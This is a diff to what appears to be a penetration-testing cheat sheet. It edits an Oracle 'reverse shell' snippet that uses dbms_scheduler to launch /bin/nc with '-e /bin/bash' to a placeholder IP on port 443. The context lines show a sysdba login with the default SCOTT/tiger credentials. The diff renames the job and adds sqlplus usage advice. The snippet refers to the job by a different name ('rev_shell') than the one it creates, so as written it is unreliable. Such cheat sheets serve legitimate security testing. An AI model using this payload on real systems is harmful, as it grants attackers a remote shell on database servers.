@@ -439,9 +439,8 @@ sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba
 ## reverse shell \#1
 
 ```text
-Get Oracle Reverse os-shell:
 begin
-dbms_scheduler.create_job( job_name    => 'MEH1337',job_type    =>
+dbms_scheduler.create_job( job_name    => 'TESTX',job_type    =>
     'EXECUTABLE',job_action => '/bin/nc',number_of_arguments => 4,start_date =>
     SYSTIMESTAMP,enabled    => FALSE,auto_drop => TRUE); 
 dbms_scheduler.set_job_argument_value('rev_shell', 1, 'TARGET-IP');
@@ -449,8 +448,11 @@ dbms_scheduler.set_job_argument_value('rev_shell', 2, '443');
 dbms_scheduler.set_job_argument_value('rev_shell', 3, '-e');
 dbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash');
 dbms_scheduler.enable('rev_shell'); 
-end; 
+end;
+/
 ```
+
+If your trying to do this with sqlplus you need to put a / at the end to complete the operation
 
 ## reverse shell \#1
 
